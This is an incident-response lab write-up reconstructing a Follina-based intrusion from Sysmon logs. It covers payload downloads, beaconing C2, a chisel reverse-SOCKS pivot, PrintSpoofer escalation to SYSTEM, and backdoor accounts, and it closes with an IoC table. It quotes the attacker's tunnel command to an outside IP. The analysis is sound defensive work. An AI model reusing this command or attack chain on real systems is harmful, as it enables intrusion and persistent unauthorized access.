# Tempest

**Category:** Endpoint / Memory Forensics
**Tools:** EvtxECmd (Eric Zimmerman), Timeline Explorer, CyberChef, Sysmon logs
**Skills demonstrated:** Follina exploitation analysis, process-chain reconstruction, C2 and persistence identification, privilege escalation tracing

---

## Scenario
Acting as an Incident Responder on a CRITICAL alert triaged by a SOC analyst. The
intrusion started from a malicious document. Known starting facts from the alert:

- The malicious document has a `.doc` extension.
- The user downloaded it via `chrome.exe`.
- The document executed a chain of commands to attain code execution.

---

## Attack Chain

**1. Delivery.** Using EvtxECmd to parse the Sysmon logs into CSV and reviewing them
in Timeline Explorer, the malicious document was identified as `free_magicules.doc`,
downloaded to disk by `chrome.exe` (PID 6596).

**2. Exploitation (Follina).** On opening the document, `winword.exe` (PID 496)
spawned `msdt.exe` — the process-creation signature of the Follina vulnerability
(**CVE-2022-30190**). `msdt.exe` then executed a Base64-encoded PowerShell payload,
confirming code execution.

**3. Download + persistence.** Decoding the Base64 revealed the payload downloaded
`update.zip` from `http://phishteam.xyz`. The implanted payload was set to run at
user logon (via `explorer.exe`); on first login it downloaded `first.exe` from the
same URL.

**4. C2.** `first.exe` established a connection to `resolvecyber.xyz` on port 80.
The channel operates as a beacon: `first.exe` fetches commands from the server,
executes them, and returns results encoded in the `q` parameter (Base64).

**5. Credential access + pivot.** Decoding the exfiltrated command output showed the
attacker ran `netstat`; among the listening ports, **5985 (WinRM)** stood out. The
attacker downloaded **chisel** (renamed `ch.exe`) and ran
`ch.exe client 167.71.199.191:8080 R:socks`, establishing a **reverse SOCKS proxy** —
an outbound tunnel to the attacker's host that allows pivoting into the victim's
internal network. Through this tunnel, the attacker authenticated to an internal
service over **WinRM** with harvested credentials.

**6. Privilege escalation to SYSTEM.** The attacker abused **SeImpersonatePrivilege**
using **PrintSpoofer** (renamed `spf.exe`) to impersonate a SYSTEM token and execute
code as SYSTEM. A second C2 connection was then established on port 8080 via
`final.exe` for the SYSTEM-level shell.

**7. Persistence + account creation.** The attacker created two users (`shion`,
`shuna`) and added `shion` to the local Administrators group (found by decoding the
Base64 `net user` and `net localgroup` commands). Finally, `final.exe` was set to run
at every boot, giving the attacker an automatic SYSTEM shell on restart.

---

## Indicators of Compromise

| Type | Value |
|------|-------|
| Malicious document | free_magicules.doc |
| Vulnerability | Follina (CVE-2022-30190) |
| Payload URLs | http://phishteam.xyz (update.zip, first.exe) |
| C2 (user-level) | resolvecyber.xyz:80 |
| Pivot tool | chisel (ch.exe) → 167.71.199.191:8080 |
| Priv-esc tool | PrintSpoofer (spf.exe), abusing SeImpersonatePrivilege |
| C2 (SYSTEM-level) | final.exe → :8080 |
| Accounts created | shion (added to Administrators), shuna |

---

## Summary
A Follina-based malicious document led to full SYSTEM compromise. The chain ran from
`winword.exe → msdt.exe → PowerShell`, through staged payloads and beaconing C2, to a
chisel reverse-SOCKS pivot, WinRM lateral authentication, PrintSpoofer privilege
escalation, and reboot-persistent SYSTEM access with attacker-created admin accounts.

**Takeaway:** the attack chained trusted Windows components (msdt, WinRM, legitimate
tools renamed) at every stage — the detection signal is the *abnormal relationship*
between them (Word spawning msdt, msdt running encoded PowerShell), not any single
malicious file.
